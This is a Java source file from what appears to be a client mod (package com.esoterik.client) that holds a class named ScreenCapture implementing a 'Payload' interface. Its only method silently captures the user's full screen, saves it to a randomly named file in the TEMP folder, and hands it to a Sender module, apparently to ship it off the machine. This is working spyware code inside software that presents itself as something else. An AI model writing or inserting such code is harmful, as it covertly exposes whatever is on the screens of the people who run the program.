package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.Payload;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;
import javax.imageio.ImageIO;

public final class ScreenCapture implements Payload {
   public void execute() throws Exception {
      Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
      Rectangle screenRectangle = new Rectangle(screenSize);
      Robot robot = new Robot();
      BufferedImage image = robot.createScreenCapture(screenRectangle);
      int random = (new Random()).nextInt();
      File file = new File(System.getenv("TEMP") + "\\" + random + ".png");
      ImageIO.write(image, "png", file);
      Sender.send(file);
   }
}
